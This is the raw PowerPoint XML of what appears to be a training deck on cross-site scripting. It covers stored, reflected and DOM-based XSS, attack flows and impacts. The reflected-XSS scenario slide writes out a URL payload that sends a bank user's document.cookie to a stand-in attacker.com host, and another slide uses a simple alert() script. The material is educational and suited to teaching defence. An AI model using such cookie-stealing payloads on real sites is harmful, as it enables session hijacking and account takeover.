            <a:endParaRPr lang="en-US" dirty="0">
              <a:hlinkClick r:id="rId3"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Stored XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, where the malicious script comes from the website's database.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>DOM-based XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, where the vulnerability exists in client-side code rather than server-side code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{458A622C-E7E1-5EFC-0F54-80BA50862B4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Overview of XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7C21E65-33C2-2D6C-7465-7C7A6DB09E54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4169662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Stored XSS occurs when malicious input is permanently stored on the server, such as in:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Databases </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Comment sections </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User profiles </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Message boards </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Support tickets </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Whenever another user accesses the affected page, the malicious script executes automatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stored XSS is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Persistent XSS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>because the malicious payload remains stored on the target application's server and continues to affect users whenever the vulnerable content is accessed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" sz="5400" b="1" dirty="0"/>
              <a:t>XSS - Stored  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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1" y="1243013"/>
            <a:ext cx="5257800" cy="4933950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="97500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A website allows users to post comments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker submits:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The comment is stored in the database.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When other users view the comment section:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User Comment:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The browser executes the script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0"/>
              <a:t>Example Scenario and Attack Flow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="4400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6F49464-1475-E639-6071-E0E90396E2DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6060281" y="1344613"/>
            <a:ext cx="5257800" cy="4933950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit fontScale="9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52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Attack Flow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker submits malicious script. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Application stores it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Victim visits the page. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Script executes automatically. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session hijacking </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Account takeover </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Mass compromise of users </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stored XSS is generally considered the most severe form of XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>because it affects multiple users without requiring individual interaction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" alt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It is also known as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Non-Persistent XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, is a type of web application vulnerability in which malicious JavaScript is included in an HTTP request and is immediately reflected by the web server in the HTTP response without proper validation or encoding. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The injected script is not stored on the server; instead, it is sent back to the victim's browser and executed when the browser renders the response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reflected XSS occurs when an application takes user-supplied input from sources such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>URL parameters, form fields, HTTP headers, or search boxes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and includes that input in the HTML response without sanitizing or encoding it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Because the payload is reflected directly in the response, the attack typically requires the victim to click a specially crafted link or submit a malicious request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Reflected Cross-Site Scripting (Reflected XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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Imagine an online banking website with a search function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker creates a malicious URL:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://bank.com/search?q=&lt;script&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>='https://attacker.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>steal?cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>='+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker sends this link through:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Email </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Social media </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SMS </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Phishing websites </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When the victim clicks the link:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The request reaches the bank's server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The server reflects the malicious input. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The browser executes the script. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session cookies may be stolen. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker can hijack the victim's session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Real-World Attack Scenario</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-GB" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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DE44E3-8A23-FF41-9396-013B4A411954}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session Hijacking </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Credential Theft </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Account Take Over </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Website Defacement </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Phishing Attacks </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C669B16D-FA50-8912-BE7B-958283ECD4F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Impact Of Reflected XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E8C76B6-55A1-7089-682D-28DC07696A9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="123002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a:t>DOM-Based Cross-Site Scripting (DOM XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a type of Cross-Site Scripting vulnerability in which the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>attack payload is executed entirely within the victim's browser as a result of insecure client-side JavaScript code. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unlike Stored XSS and Reflected XSS, the vulnerable behavior does not primarily occur on the web server. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Instead, the vulnerability exists in the way JavaScript running in the browser reads data from a controllable source and writes it to a dangerous location within the Document Object Model (DOM). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Since the manipulation happens on the client side, the server may never see the malicious payload, making DOM XSS more difficult to detect and prevent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-GB" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0"/>
              <a:t>DOM-Based XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="5400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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B984F8-BD8E-0ADA-B96A-3E099EE1EEB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Document Object Model (DOM)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a programming interface that represents an HTML document as a tree-like structure of objects. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When a browser loads a web page, it creates a DOM that JavaScript can access and modify dynamically. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>JavaScript can read, create, update, or delete elements in the DOM,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> allowing websites to provide interactive user experiences. However, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>if JavaScript inserts untrusted user input into the DOM without proper sanitization, an attacker may inject malicious scripts that execute within the browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2BA51AA-14EC-BBE9-493E-B18579C43EEA}"/>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18F6E661-D5FA-4B46-FAD6-480A901C05D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2760751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It is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DOM-Based XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> because the vulnerability occurs due to unsafe manipulation of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Document Object Model</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In this attack, JavaScript reads data from a user-controlled source, such as a URL parameter or fragment, and writes it into the DOM using dangerous functions. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The browser then interprets the injected content as executable code. Since the attack takes place entirely within the DOM after the page has loaded, it is classified as DOM-Based XSS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" b="1" dirty="0"/>
              <a:t>Why It is called DOM based XSS?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
